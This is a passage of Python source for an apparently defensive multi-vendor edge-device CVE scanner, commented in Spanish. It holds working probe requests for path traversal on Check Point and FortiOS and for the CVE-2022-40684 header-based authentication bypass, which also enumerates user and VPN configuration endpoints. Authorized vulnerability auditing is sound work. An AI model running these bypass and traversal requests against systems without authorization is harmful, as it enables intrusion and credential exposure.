            "method": "active_probe",
            "evidence": None,
            "impact": None,
            "severity": "HIGH",
            "cvss": 8.6,
            "description": CHECKPOINT_CVE_DB["CVE-2024-24919"]["description"],
        }
        try:
            async with self.session.post(
                f"{base_url}/clients/MyCRL",
                data="aCSHELL/../../../../../../../etc/hostname",
                headers={"Content-Type": "text/plain"},
                timeout=self.to,
                allow_redirects=False,
                ssl=False,
            ) as r:
                if r.status == 200:
                    cuerpo = await r.text(errors="replace")
                    # Un hostname del sistema tiene 1-63 caracteres alfanuméricos
                    # El endpoint normal debería devolver XML o binario, no un hostname plano
                    lineas = [l.strip() for l in cuerpo.splitlines() if l.strip()]
                    if lineas and len(lineas[0]) <= 63 and re.match(r'^[a-zA-Z0-9\-]+$', lineas[0]):
                        resultado["confirmed"] = True
                        resultado["evidence"] = (
                            f"POST /clients/MyCRL respondió HTTP 200 con contenido de texto "
                            f"que parece un hostname del sistema — traversal de ruta confirmado"
                        )
                        resultado["impact"] = (
                            "Lectura arbitraria de ficheros del sistema incluido /etc/shadow; "
                            "credenciales del sistema operativo en riesgo"
                        )
                    else:
                        resultado["evidence"] = f"HTTP 200 con cuerpo inesperado — revisión manual recomendada"
                elif r.status in (403, 404):
                    resultado["evidence"] = f"HTTP {r.status} — endpoint protegido o parcheado"
                else:
                    resultado["evidence"] = f"HTTP {r.status}"
        except asyncio.TimeoutError:
            resultado["evidence"] = "Timeout"
        except Exception as e:
            resultado["evidence"] = f"Error: {str(e)[:60]}"

        return resultado

    async def check_cisco_iosxe_webui_exposed(self, base_url: str) -> Dict:
        """
        Verifica si la interfaz de gestión Web UI de Cisco IOS-XE está expuesta.
        Si /webui/ responde con contenido IOS-XE, existe superficie de ataque
        para CVE-2023-20198 (privilege escalation) y CVE-2023-20273 (RCE).
        """
        resultado = {
            "cve": "CISCO-IOSXE-WEBUI-EXPOSURE",
            "confirmed": False,
            "method": "active_probe",
            "evidence": None,
            "impact": "Web UI IOS-XE expuesta — superficie de ataque para CVE-2023-20198 (CVSS 10.0)",
            "severity": "HIGH",
            "cvss": 7.5,
            "description": "Interfaz de gestión Web UI Cisco IOS-XE accesible",
        }
        try:
            async with self.session.get(
                f"{base_url}/webui/",
                timeout=self.to,
                allow_redirects=True,
                ssl=False,
            ) as r:
                if r.status == 200:
                    cuerpo = await r.text(errors="replace")
                    if any(kw in cuerpo.lower() for kw in ("cisco", "iosxe", "ios xe", "webui")):
                        resultado["confirmed"] = True
                        resultado["evidence"] = "HTTP 200 en /webui/ con contenido Cisco IOS-XE"
        except Exception:
            pass
        return resultado

    async def check_bigip_tmui_exposure(self, base_url: str) -> Dict:
        """
        Verifica si la Traffic Management User Interface (TMUI) de F5 BIG-IP
        está accesible públicamente.

        Un TMUI expuesto es la superficie de ataque de:
          · CVE-2020-5902 (CVSS 9.8) — traversal de ruta → RCE sin auth
          · CVE-2023-46747 (CVSS 9.8) — HTTP request smuggling → auth bypass → RCE

        Sonda segura: GET /tmui/login.jsp — respuesta 200 con contenido BIG-IP
        confirma la exposición sin intentar explotar ninguna vulnerabilidad.
        """
        resultado = {
            "cve": "F5-BIGIP-TMUI-EXPOSURE",
            "confirmed": False,
            "method": "active_probe",
            "evidence": None,
            "impact": (
                "TMUI F5 BIG-IP expuesto públicamente — superficie de ataque para "
                "CVE-2020-5902 (RCE) y CVE-2023-46747 (auth bypass RCE, CVSS 9.8)"
            ),
            "severity": "CRITICAL",
            "cvss": 9.8,
            "description": "Traffic Management User Interface (TMUI) de F5 BIG-IP accesible sin restricción de red",
        }
        for ruta in ("/tmui/login.jsp", "/tmui/", "/tmui/tmui/login/welcome.jsp"):
            try:
                async with self.session.get(
                    f"{base_url}{ruta}",
                    timeout=self.to,
                    allow_redirects=True,
                    ssl=False,
                ) as r:
                    if r.status == 200:
                        cuerpo = await r.text(errors="replace")
                        if any(kw in cuerpo.lower() for kw in ("big-ip", "bigip", "f5", "tmui")):
                            resultado["confirmed"] = True
                            resultado["evidence"] = (
                                f"HTTP 200 en {ruta} con contenido BIG-IP — "
                                "TMUI expuesto; CVE-2020-5902 y CVE-2023-46747 aplicables"
                            )
                            return resultado
                    elif r.status in (301, 302):
                        resultado["evidence"] = f"HTTP {r.status} en {ruta} — redirección TMUI detectada"
            except Exception:
                pass
        return resultado

    async def check_bigip_icl_exposure(self, base_url: str) -> Dict:
        """
        Verifica si el endpoint iControl REST de F5 BIG-IP está accesible.

        iControl REST expuesto amplifica el riesgo de CVE-2022-1388 (CVSS 9.8),
        que permite omisión de autenticación mediante cabeceras HTTP manipuladas.

        Sonda segura: GET /mgmt/shared/authn/login — una respuesta que no sea 404
        confirma la exposición del endpoint. Un sistema no expuesto no debería
        tener /mgmt/ accesible desde redes no administradas.
        """
        resultado = {
            "cve": "CVE-2022-1388",
            "confirmed": False,
            "method": "active_probe",
            "evidence": None,
            "impact": (
                "iControl REST API accesible — CVE-2022-1388 permite omisión de "
                "autenticación completa y ejecución de comandos como root"
            ),
            "severity": "CRITICAL",
            "cvss": 9.8,
            "description": F5_CVE_DB["CVE-2022-1388"]["description"],
        }
        try:
            async with self.session.get(
                f"{base_url}/mgmt/shared/authn/login",
                timeout=self.to,
                allow_redirects=False,
                ssl=False,
            ) as r:
                if r.status in (200, 401, 405):
                    resultado["confirmed"] = True
                    resultado["evidence"] = (
                        f"HTTP {r.status} en /mgmt/shared/authn/login — "
                        "iControl REST API expuesto; CVE-2022-1388 aplicable"
                    )
                elif r.status == 403:
                    resultado["evidence"] = "HTTP 403 en /mgmt/ — acceso restringido pero endpoint existe"
                else:
                    resultado["evidence"] = f"HTTP {r.status} en /mgmt/"
        except asyncio.TimeoutError:
            resultado["evidence"] = "Timeout"
        except Exception as e:
            resultado["evidence"] = f"Error: {str(e)[:60]}"
        return resultado

    async def check_cisco_asa_vpn_exposed(self, base_url: str) -> Dict:
        """
        Verifica si el portal WebVPN de Cisco ASA está expuesto.
        La exposición amplifica el riesgo de CVE-2023-20269 (unauthorized VPN sessions).
        """
        resultado = {
            "cve": "CISCO-ASA-WEBVPN-EXPOSURE",
            "confirmed": False,
            "method": "active_probe",
            "evidence": None,
            "impact": "Portal WebVPN ASA expuesto — superficie de ataque para CVE-2023-20269",
            "severity": "MEDIUM",
            "cvss": 5.3,
            "description": "Portal WebVPN Cisco ASA accesible públicamente",
        }
        for ruta in ("/+CSCOE+/logon.html", "/remote/logon", "/vpn/"):
            try:
                async with self.session.get(
                    f"{base_url}{ruta}",
                    timeout=self.to,
                    allow_redirects=False,
                    ssl=False,
                ) as r:
                    if r.status in (200, 301, 302):
                        resultado["confirmed"] = True
                        resultado["evidence"] = f"HTTP {r.status} en {ruta} — portal WebVPN expuesto"
                        return resultado
            except Exception:
                pass
        return resultado

    def check_version_cves_vendor(
        self,
        vendor: str,
        version: Optional[str],
    ) -> List[Dict]:
        """
        Mapea la versión detectada a CVEs conocidos para el fabricante dado,
        sin sondas de red adicionales. Igual que CVEChecker.check_version_cves
        pero para fabricantes no-Fortinet.
        """
        if not version or vendor not in VENDOR_CVE_MAP:
            return []
        cve_db = VENDOR_CVE_MAP[vendor]
        resultados: List[Dict] = []
        tupla_ver = VersionDetector.parse_version(version)
        if not tupla_ver:
            return resultados

        for cve_id, meta in cve_db.items():
            for minimo, maximo in meta.get("affected_versions", []):
                if minimo <= tupla_ver <= maximo:
                    resultados.append({
                        "cve": cve_id,
                        "confirmed": False,
                        "method": "version_match",
                        "evidence": (
                            f"Versión {version} dentro del rango afectado "
                            f"{'.'.join(map(str, minimo))}–{'.'.join(map(str, maximo))}"
                        ),
                        "impact": meta["description"],
                        "severity": meta["severity"],
                        "cvss": meta["cvss"],
                        "description": meta["description"],
                        "mitigation": meta.get("mitigation"),
                    })
                    break

        return resultados


# =============================================================================
# VERIFICADOR DE CVEs (FortiOS — mantenido de v1.x)
# =============================================================================

class CVEChecker:
    """
    Realiza sondas de red específicas para confirmar la explotabilidad de
    cada CVE de forma no destructiva.

    Principio de diseño
    -------------------
    Todas las sondas están diseñadas para obtener evidencia de vulnerabilidad
    sin:
      · Extraer datos sensibles reales (credenciales, configuraciones)
      · Modificar el estado del dispositivo objetivo
      · Interrumpir o degradar el servicio

    Para CVEs basados en versión (CVE-2023-27997, CVE-2024-21762) no existe
    un método pasivo de confirmación, por lo que se usa comparación de versión
    con confirmed=False y method='version_match'.
    """

    def __init__(self, session: aiohttp.ClientSession, timeout: int = 10):
        """
        Parámetros
        ----------
        session : aiohttp.ClientSession  — Sesión HTTP compartida con el scanner principal
        timeout : int                    — Tiempo máximo de espera por petición en segundos
        """
        self.session = session
        self.to = aiohttp.ClientTimeout(total=timeout)

    async def check_cve_2018_13379(self, base_url: str) -> Dict:
        """
        Sonda el vector de traversal de ruta CVE-2018-13379.

        Método de prueba
        ----------------
        En lugar de solicitar /dev/cmdb/sslvpn_websession (fichero de sesiones
        con credenciales), se solicita /lib/x86_64-linux-gnu/libssl.so.1.0.0,
        una librería compartida pública del sistema que confirma el traversal
        sin exponer datos de usuarios.

        Un dispositivo vulnerable responde con HTTP 200 y Content-Type
        application/octet-stream (binario), lo que confirma que la ruta de
        traversal funciona. Un dispositivo parcheado devuelve 403 o 404.

        Parámetros
        ----------
        base_url : str  — URL base del objetivo (ej. https://10.0.0.1)

        Retorna
        -------
        Dict con campos:
          cve, confirmed (bool), method, evidence (str), impact (str),
          severity, cvss, description
        """
        resultado = {
            "cve": "CVE-2018-13379",
            "confirmed": False,
            "method": "active_probe",
            "evidence": None,
            "impact": None,
            "severity": "CRITICAL",
            "cvss": 9.8,
            "description": FORTIOS_CVE_DB["CVE-2018-13379"]["description"],
        }

        # Ruta de sonda: librería pública del SO, no datos de sesión
        ruta_sonda = "/remote/fgt_lang?lang=/../../../../../../../lib/x86_64-linux-gnu/libssl.so.1.0.0"

        try:
            async with self.session.get(
                f"{base_url}{ruta_sonda}",
                timeout=self.to,
                allow_redirects=False,  # No seguir redirecciones — un 302 ya indica login
                ssl=False,
            ) as r:
                content_type = r.headers.get("Content-Type", "")

                if r.status == 200 and ("octet-stream" in content_type or "application/" in content_type):
                    # Leer solo los primeros 128 bytes para confirmar contenido binario
                    cabeza = await r.content.read(128)
                    if cabeza:
                        resultado["confirmed"] = True
                        resultado["evidence"] = (
                            f"HTTP 200 en ruta de traversal; Content-Type: {content_type}; "
                            f"Bytes recibidos: {len(cabeza)}"
                        )
                        resultado["impact"] = (
                            "El fichero de sesión SSL-VPN (/dev/cmdb/sslvpn_websession) "
                            "con credenciales en texto plano puede ser extraído sin autenticación"
                        )
                elif r.status == 200:
                    # Algunos dispositivos responden 200 con HTML de error — no es traversal real
                    cuerpo = await r.text(errors="replace")
                    if "login" not in cuerpo.lower() and len(cuerpo) > 200:
                        resultado["confirmed"] = True
                        resultado["evidence"] = "HTTP 200 con contenido inesperado en ruta de traversal"
                        resultado["impact"] = "Traversal de ruta confirmado; extracción de credenciales posible"
                else:
                    resultado["evidence"] = f"HTTP {r.status} — objetivo posiblemente parcheado o sin SSL-VPN"

        except asyncio.TimeoutError:
            resultado["evidence"] = "Timeout — objetivo inaccesible o filtrado"
        except Exception as e:
            resultado["evidence"] = f"Error de red: {str(e)[:80]}"

        return resultado

    async def check_cve_2022_40684(self, base_url: str) -> Dict:
        """
        Sonda el bypass de autenticación CVE-2022-40684.

        Método de prueba
        ----------------
        El bypass funciona porque el firmware afectado trata las peticiones
        con la cabecera 'Forwarded: for=127.0.0.1' como provenientes del
        loopback local, saltándose la validación de credenciales.

        Se envía una petición GET (sin datos de escritura) al endpoint de
        listado de administradores. Si la respuesta es HTTP 200 con datos de
        configuración, el bypass está activo.

        Se usa User-Agent 'Report Runner' porque algunos análisis de Fortinet
        muestran que era el valor usado en los exploits originales para
        identificar el vector.

        Parámetros
        ----------
        base_url : str  — URL base del objetivo

        Retorna
        -------
        Dict — misma estructura que check_cve_2018_13379
        """
        resultado = {
            "cve": "CVE-2022-40684",
            "confirmed": False,
            "method": "active_probe",
            "evidence": None,
            "impact": None,
            "severity": "CRITICAL",
            "cvss": 9.8,
            "description": FORTIOS_CVE_DB["CVE-2022-40684"]["description"],
        }

        host = urlparse(base_url).hostname or base_url
        cabeceras_bypass = {
            "User-Agent": "Report Runner",
            # Cabecera que engaña al firmware haciéndole creer que la petición viene del loopback
            "Forwarded": f'for="[127.0.0.1]";by="[127.0.0.1]";host="{host}"',
            "Content-Type": "application/json",
            "Accept": "application/json",
        }

        try:
            async with self.session.get(
                f"{base_url}/api/v2/cmdb/system/admin",
                headers=cabeceras_bypass,
                timeout=self.to,
                allow_redirects=False,
                ssl=False,
            ) as r:
                if r.status == 200:
                    cuerpo = await r.text(errors="replace")
                    # Verificar que la respuesta contiene estructura de datos de admin,
                    # no solo una página HTML de error disfrazada de 200
                    if any(clave in cuerpo for clave in ('"results"', '"admin"', '"status"')):
                        resultado["confirmed"] = True
                        resultado["evidence"] = (
                            "HTTP 200 en /api/v2/cmdb/system/admin sin credenciales "
                            "(bypass por cabecera Forwarded); respuesta contiene datos de administrador"
                        )
                        resultado["impact"] = (
                            "Acceso administrativo completo sin autenticación; "
                            "el atacante puede añadir claves SSH o modificar cuentas de admin"
                        )
                    else:
                        resultado["evidence"] = "HTTP 200 con cuerpo inesperado — revisión manual recomendada"
                elif r.status in (401, 403):
                    resultado["evidence"] = f"HTTP {r.status} — protegido; posiblemente parcheado"
                elif r.status == 404:
                    resultado["evidence"] = "HTTP 404 — endpoint de API REST no presente"
                else:
                    resultado["evidence"] = f"HTTP {r.status}"

        except asyncio.TimeoutError:
            resultado["evidence"] = "Timeout"
        except Exception as e:
            resultado["evidence"] = f"Error de red: {str(e)[:80]}"

        return resultado

    async def check_api_info_disclosure(self, base_url: str) -> Dict:
        """
        Verifica si el endpoint de estado del sistema expone la versión sin autenticación.

        Este no es un CVE propio, pero es un vector de enumeración de información
        relevante porque permite al atacante conocer la versión exacta del firmware
        para seleccionar exploits específicos.

        Parámetros
        ----------
        base_url : str  — URL base del objetivo

        Retorna
        -------
        Dict con cve='INFO-DISCLOSURE' y confirmed=True si hay versión expuesta
        """
        resultado = {
            "cve": "INFO-DISCLOSURE",
            "confirmed": False,
            "method": "active_probe",
            "evidence": None,
            "impact": None,
            "severity": "MEDIUM",
            "cvss": 5.3,
            "description": "Divulgación de versión/estado sin autenticación via REST API",
        }
        try:
            async with self.session.get(
                f"{base_url}/api/v2/monitor/system/status",
                timeout=self.to,
                ssl=False,
            ) as r:
                if r.status == 200:
                    cuerpo = await r.text(errors="replace")
                    ver_m = re.search(r'"version"\s*:\s*"([\d.]+)"', cuerpo)
                    if ver_m:
                        resultado["confirmed"] = True
                        resultado["evidence"] = (
                            f"Versión {ver_m.group(1)} expuesta sin autenticación"
                        )
                        resultado["impact"] = (
                            "Permite selección precisa de exploits basados en versión"
                        )
        except Exception:
            pass  # Este chequeo es informativo; los errores de red no son bloqueantes

        return resultado

    def check_version_cves(self, version: Optional[str]) -> List[Dict]:
        """
        Mapea la versión detectada a CVEs conocidos sin sondas de red adicionales.

        Se usa para CVEs cuya confirmación requeriría explotación real (heap overflow,
        escrituras fuera de límites), que no es apropiada en una auditoría defensiva.

        Parámetros
        ----------
        version : Optional[str]  — Versión detectada en Fase 1 (ej. '7.0.5')

        Retorna
        -------
        List[Dict]  — Lista de findings con method='version_match' y confirmed=False.
                      La lista puede estar vacía si no hay versión o no hay coincidencia.
        """
        resultados = []
        if not version:
            return resultados

        tupla_ver = VersionDetector.parse_version(version)
        if not tupla_ver:
            return resultados

        # Iterar sobre todos los CVEs de la BD y comprobar si la versión cae en algún rango
        for cve_id, meta in FORTIOS_CVE_DB.items():
            for minimo, maximo in meta.get("affected_versions", []):
                if minimo <= tupla_ver <= maximo:
                    resultados.append({
                        "cve": cve_id,
                        "confirmed": False,
                        "method": "version_match",
                        "evidence": (
                            f"Versión {version} dentro del rango afectado "
                            f"{'.'.join(map(str, minimo))}–{'.'.join(map(str, maximo))}"
                        ),
                        "impact": meta["description"],
                        "severity": meta["severity"],
                        "cvss": meta["cvss"],
                        "description": meta["description"],
                        "mitigation": meta.get("mitigation"),
                    })
                    break  # Un CVE no puede aparecer dos veces aunque el rango haga match múltiple

        return resultados


# =============================================================================
# ANALIZADOR DE EXPOSICIÓN SECUNDARIA
# =============================================================================

class ExposureAnalyzer:
    """
    Tras confirmar uno o más CVEs, analiza la superficie de ataque secundaria
    para evaluar el impacto real de la explotación.

    Funciona en tres ejes:
      1. Superficie general (cabeceras de seguridad, WAF)
      2. Endpoints de API REST accesibles mediante el bypass CVE-2022-40684
      3. Portal SSL-VPN expuesto (incrementa el riesgo de CVE-2018-13379 et al.)

    Todos los análisis son de solo lectura: ninguna petición modifica el estado
    del dispositivo.
    """

    def __init__(self, session: aiohttp.ClientSession):
        self.session = session
        self.to = aiohttp.ClientTimeout(total=8)

    async def analyze(self, base_url: str, cve_findings: List[Dict]) -> List[Dict]:
        """
        Orquesta el análisis de exposición según qué CVEs fueron confirmados.

        Parámetros
        ----------
        base_url     : str        — URL base del objetivo
        cve_findings : List[Dict] — Resultados de CVEChecker para este objetivo

        Retorna
        -------
        List[Dict]  — Lista de vectores de exposición encontrados
        """
        vectores: List[Dict] = []

        # Identificar qué CVEs han sido confirmados con sonda activa
        cves_confirmados = {f["cve"] for f in cve_findings if f.get("confirmed")}

        # Tareas concurrentes según el contexto
        tareas = [self._check_superficie(base_url)]

        if "CVE-2022-40684" in cves_confirmados:
            tareas.append(self._check_endpoints_api(base_url))

        # Si hay cualquier CVE SSL-VPN confirmado, verificar exposición del portal
        if cves_confirmados.intersection({"CVE-2018-13379", "CVE-2023-27997", "CVE-2024-21762"}):
            tareas.append(self._check_portal_sslvpn(base_url))

        resultados = await asyncio.gather(*tareas, return_exceptions=True)
        for r in resultados:
            if isinstance(r, list):
                vectores.extend(r)

        return vectores

    async def _check_superficie(self, base_url: str) -> List[Dict]:
        """
        Audita la superficie de seguridad básica del endpoint HTTPS:
        cabeceras de seguridad ausentes y presencia de WAF upstream.
        """
        vectores: List[Dict] = []
        try:
            async with self.session.get(base_url, timeout=self.to, ssl=False) as r:
                cabeceras = dict(r.headers)
                servidor = cabeceras.get("Server", "")

                # Detección de WAF/CDN: presencia en la cabecera Server o X-Powered-By
                if any(waf in servidor.lower() for waf in ("cloudflare", "akamai", "f5", "imperva")):
                    vectores.append({
                        "type": "WAF_DETECTED",
                        "description": f"WAF/CDN detectado: {servidor}",
                        "severity": "INFO",
                        "impact": "Algunos vectores de ataque pueden estar mitigados upstream",
                    })

                # HSTS ausente: permite ataques de downgrade HTTP que exponen credenciales VPN en tránsito
                if "Strict-Transport-Security" not in cabeceras:
                    vectores.append({
                        "type": "MISSING_HSTS",
                        "description": "HSTS no configurado",
                        "severity": "LOW",
                        "impact": "Posible downgrade a HTTP que expone credenciales VPN en tránsito",
                    })

                # X-Frame-Options ausente: vector de clickjacking sobre el panel de login
                tiene_csp_frame = "frame-ancestors" in cabeceras.get("Content-Security-Policy", "").lower()
                if "X-Frame-Options" not in cabeceras and not tiene_csp_frame:
                    vectores.append({
                        "type": "MISSING_XFRAME",
                        "description": "Protección contra clickjacking ausente",
                        "severity": "LOW",
                        "impact": "El panel de administración puede ser embebido en un iframe malicioso",
                    })

        except Exception:
            pass

        return vectores

    async def _check_endpoints_api(self, base_url: str) -> List[Dict]:
        """
        Enumera recursos sensibles de la API REST accesibles mediante el bypass
        de CVE-2022-40684.

        Esta comprobación solo se ejecuta si CVE-2022-40684 ha sido confirmado
        previamente, ya que presupone el bypass de autenticación activo.
        """
        vectores: List[Dict] = []

        # Cabecera de bypass idéntica a la de CVEChecker.check_cve_2022_40684
        cabeceras_bypass = {
            "User-Agent": "Report Runner",
            "Forwarded": 'for="[127.0.0.1]";by="[127.0.0.1]"',
        }

        # Endpoints con información especialmente sensible en caso de acceso sin auth
        endpoints_sensibles = [
            ("/api/v2/cmdb/system/interface",   "Enumeración de interfaces de red"),
            ("/api/v2/monitor/system/status",   "Metadatos del sistema y versión"),
            ("/api/v2/cmdb/vpn.ssl/settings",   "Configuración SSL-VPN"),
            ("/api/v2/cmdb/user/local",         "Base de datos de usuarios locales"),
        ]

        for endpoint, descripcion in endpoints_sensibles:
            try:
                async with self.session.get(
                    f"{base_url}{endpoint}",
                    headers=cabeceras_bypass,
                    timeout=self.to,
                    ssl=False,
                ) as r:
                    if r.status == 200:
                        vectores.append({
                            "type": "UNAUTH_API_ACCESS",
                            "endpoint": endpoint,
                            "description": descripcion,
                            "severity": "HIGH",
                            "impact": "Datos de configuración sensibles accesibles sin credenciales",
                        })
            except Exception:
                pass

        return vectores

    async def _check_portal_sslvpn(self, base_url: str) -> List[Dict]:
        """
        Comprueba si el portal web SSL-VPN está expuesto públicamente.

        Un portal expuesto multiplica el riesgo de CVEs pre-autenticación
        (CVE-2018-13379, CVE-2023-27997, CVE-2024-21762) porque amplía la
        superficie de ataque a cualquier actor en internet.
        """
        vectores: List[Dict] = []
        try:
            async with self.session.get(
                f"{base_url}/remote/login",
                timeout=self.to,
                ssl=False,
            ) as r:
                if r.status == 200:
                    cuerpo = await r.text(errors="replace")
                    if "sslvpn" in cuerpo.lower() or "ssl vpn" in cuerpo.lower():
                        vectores.append({
                            "type": "SSLVPN_PORTAL_EXPOSED",
                            "description": "Portal web SSL-VPN accesible públicamente",
                            "severity": "MEDIUM",
                            "impact": (
                                "Amplía la superficie de ataque para CVEs pre-autenticación: "
                                "CVE-2018-13379, CVE-2023-27997, CVE-2024-21762"
                            ),
                        })
        except Exception:
            pass

        return vectores


# =============================================================================
# GENERADOR DE INFORMES
# =============================================================================

class ReportGenerator:
    """
    Exporta los resultados del escaneo en formato JSON estructurado y HTML
    interactivo con tema oscuro (dark cyberpunk).

    Los informes HTML son documentos standalone sin dependencias externas
    (sin CDN, sin fuentes remotas) para poder abrirse en entornos aislados
    o adjuntarse directamente en informes de auditoría.
    """

    @staticmethod
    def to_json(results: List[ScanResult], ruta: str):
        """
        Exporta todos los resultados como JSON estructurado.

        Estructura del fichero:
          {
            "tool": "vamp-forticheck",
            "version": "2.0",
            "generated": "<ISO-8601>",
            "summary": { ... métricas agregadas por fabricante ... },
            "results": [ ... un objeto por objetivo ... ]
          }

        Parámetros
        ----------
        results : List[ScanResult]  — Lista de resultados del escáner
        ruta    : str               — Ruta del fichero de salida (.json)
        """
        # Contar dispositivos por fabricante para el resumen
        vendors_detectados: Dict[str, int] = {}
        for r in results:
            if r.vendor:
                vendors_detectados[r.vendor] = vendors_detectados.get(r.vendor, 0) + 1

        datos = {
            "tool": "vamp-forticheck",
            "version": "2.0",
            "generated": datetime.now(timezone.utc).isoformat(),
            "summary": {
                "total_objetivos": len(results),
                "vendors_detectados": vendors_detectados,
                "fortios_confirmados": sum(1 for r in results if r.is_fortios),
                "cves_confirmados": sum(
                    1 for r in results for f in r.cve_findings if f.get("confirmed")
                ),
                "objetivos_criticos": sum(1 for r in results if r.risk_level == "CRITICAL"),
            },
            "results": [asdict(r) for r in results],
        }
        Path(ruta).write_text(json.dumps(datos, indent=2, default=str), encoding="utf-8")

    @staticmethod
    def to_html(results: List[ScanResult], ruta: str):
        """
        Genera un informe HTML standalone con tema oscuro tipo cyberpunk.

        El informe incluye (v2.0):
          · Tarjetas de métricas resumen en la parte superior
          · Tabla principal con todos los objetivos, fabricante y nivel de riesgo
          · Badges de severidad con código de color por nivel
          · Badges de fabricante con código de color por vendor
          · Pie de informe con fecha/hora de generación

        Parámetros
        ----------
        results : List[ScanResult]  — Lista de resultados del escáner
        ruta    : str               — Ruta del fichero de salida (.html)
        """
        # Mapa de fabricante a clase CSS y etiqueta
        _VENDOR_BADGE = {
            "FortiOS":      ("vendor-fortios",    "FortiOS"),
            "PAN-OS":       ("vendor-panos",      "PAN-OS"),
            "Cisco-ASA":    ("vendor-cisco",      "Cisco ASA"),
            "Cisco-IOS-XE": ("vendor-cisco",      "Cisco IOS-XE"),
            "Check-Point":  ("vendor-checkpoint", "Check Point"),
            "Juniper":      ("vendor-juniper",    "Juniper"),
            "F5-BIG-IP":    ("vendor-f5",         "F5 BIG-IP"),
        }

        # Construir las filas de la tabla
        filas = ""
        for r in results:
            if r.error == "OUT_OF_SCOPE":
                continue
            cves_confirmados = [f["cve"] for f in r.cve_findings if f.get("confirmed")]
            clase_fila = r.risk_level.lower()
            vendor_clase, vendor_label = _VENDOR_BADGE.get(
                r.vendor or "", ("vendor-unknown", r.vendor or "—")
            )
            filas += f"""
            <tr class="fila-{clase_fila}">
                <td><code>{r.target}</code></td>
                <td><span class="badge {vendor_clase}">{vendor_label}</span></td>
                <td>{r.detected_version or "—"}</td>
                <td>{", ".join(cves_confirmados) if cves_confirmados else "—"}</td>
                <td><span class="badge badge-{clase_fila}">{r.risk_level}</span></td>
                <td>{r.risk_score:.1f}</td>
                <td>{r.error or "—"}</td>
            </tr>"""

        # Tarjetas de métricas resumen
        n_vendors = len({r.vendor for r in results if r.vendor})
        metricas = {
            "Objetivos": len([r for r in results if r.error != "OUT_OF_SCOPE"]),
            "Fabricantes": n_vendors,
            "CVEs Confirmados": sum(1 for r in results for f in r.cve_findings if f.get("confirmed")),
            "Objetivos Críticos": sum(1 for r in results if r.risk_level == "CRITICAL"),
        }
        tarjetas = "".join(
            f'<div class="tarjeta"><div class="valor">{v}</div><div class="etiqueta">{k}</div></div>'
            for k, v in metricas.items()
        )

        html = f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>vamp-forticheck — Informe {datetime.now().strftime('%Y-%m-%d')}</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{font-family:'Courier New',monospace;background:#0a0a0a;color:#ddd;padding:24px;line-height:1.5}}
  h1{{color:#ff003c;font-size:1.4em;margin-bottom:4px;letter-spacing:1px}}
  .subtitulo{{color:#555;font-size:.8em;margin-bottom:20px}}
  .metricas{{display:flex;gap:12px;margin-bottom:24px;flex-wrap:wrap}}
  .tarjeta{{background:#141414;border:1px solid #222;padding:12px 20px;border-radius:4px;min-width:130px}}
  .tarjeta .valor{{font-size:2em;font-weight:700;color:#ff003c}}
  .tarjeta .etiqueta{{font-size:.75em;color:#666;text-transform:uppercase;letter-spacing:.5px}}
  table{{width:100%;border-collapse:collapse;font-size:.85em}}
  th{{background:#1a0000;color:#ff003c;padding:8px 10px;text-align:left;border:1px solid #2a2a2a;font-size:.8em;text-transform:uppercase;letter-spacing:.5px}}
  td{{padding:7px 10px;border:1px solid #1e1e1e}}
  .fila-critical{{background:rgba(255,0,60,.06)}}
  .fila-high{{background:rgba(255,100,0,.06)}}
  .fila-medium{{background:rgba(255,200,0,.04)}}
  .badge{{padding:2px 7px;border-radius:3px;font-size:.75em;font-weight:700}}
  .badge-critical{{background:#ff003c;color:#fff}}
  .badge-high{{background:#ff6400;color:#fff}}
  .badge-medium{{background:#ffc800;color:#000}}
  .badge-low{{background:#0090ff;color:#fff}}
  .badge-info,.badge-unknown{{background:#333;color:#999}}
  .vendor-fortios{{background:#7a0000;color:#ff8080}}
  .vendor-panos{{background:#7a3a00;color:#ffa040}}
  .vendor-cisco{{background:#004a7a;color:#80cfff}}
  .vendor-checkpoint{{background:#4a007a;color:#cf80ff}}
  .vendor-juniper{{background:#006a40;color:#80ffbf}}
  .vendor-f5{{background:#006080;color:#80dfff}}
  .vendor-unknown{{background:#222;color:#888}}
  .si{{color:#00e676;font-weight:700}} .no{{color:#555}}
  .pie{{margin-top:20px;color:#333;font-size:.75em;border-top:1px solid #1e1e1e;padding-top:10px}}
  code{{background:#111;padding:1px 4px;border-radius:2px;font-size:.9em}}
</style>
</head>
<body>
<h1>&#9888; vamp-forticheck v2.0 — Informe Multi-Vendor Edge Device Scanner</h1>
<p class="subtitulo">VampSecure Labs · VampSecure Studios · Solo para uso en auditorías autorizadas</p>
<div class="metricas">{tarjetas}</div>
<table>
<tr><th>Objetivo</th><th>Fabricante</th><th>Versión</th><th>CVEs Confirmados</th><th>Riesgo</th><th>Score</th><th>Notas</th></tr>
{filas}
</table>
<div class="pie">
Generado por vamp-forticheck v2.0 · VampSecure Labs · VampSecure Studios · {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}
</div>
</body>
</html>"""
        Path(ruta).write_text(html, encoding="utf-8")


# =============================================================================
# ESCÁNER PRINCIPAL
# =============================================================================

class FortiScanner:
    """
    Orquestador principal del proceso de escaneo.

    Gestiona el ciclo de vida completo de cada objetivo:
      1. Validación de scope
      2. Detección de FortiOS (Fase 1)
      3. Verificación de CVEs (Fase 2)
      4. Análisis de exposición (Fase 3)
      5. Cálculo de riesgo y nivel semáforo

    La concurrencia se controla con un asyncio.Semaphore para evitar saturar
    la red o los dispositivos objetivo.
    """

    # Umbrales de puntuación para asignar nivel semáforo
    UMBRALES_RIESGO = {
        "CRITICAL": 9.0,
        "HIGH":     7.0,
        "MEDIUM":   4.0,
        "LOW":      0.1,
    }

    def __init__(self, args):
        """
        Parámetros
        ----------
        args : argparse.Namespace  — Argumentos CLI parseados por main()
        """
        self.args = args
        self.scope = ScopeValidator(args.scope)

    def _normalizar_url(self, objetivo: str) -> str:
        """Añade el esquema https:// si el objetivo no incluye protocolo."""
        if "://" in objetivo:
            return objetivo.rstrip("/")
        return f"https://{objetivo.rstrip('/')}"

    async def _escanear_objetivo(self, objetivo: str, session: aiohttp.ClientSession) -> ScanResult:
        """
        Ejecuta las fases de análisis para un objetivo individual.

        A partir de v2.0 el método detecta el fabricante del dispositivo y despacha
        las sondas CVE al checker adecuado: CVEChecker para FortiOS (retrocompat. v1.x)
        y MultiVendorCVEChecker para PAN-OS, Cisco, Check Point y Juniper.

        Parámetros
        ----------
        objetivo : str                    — Host/URL a escanear
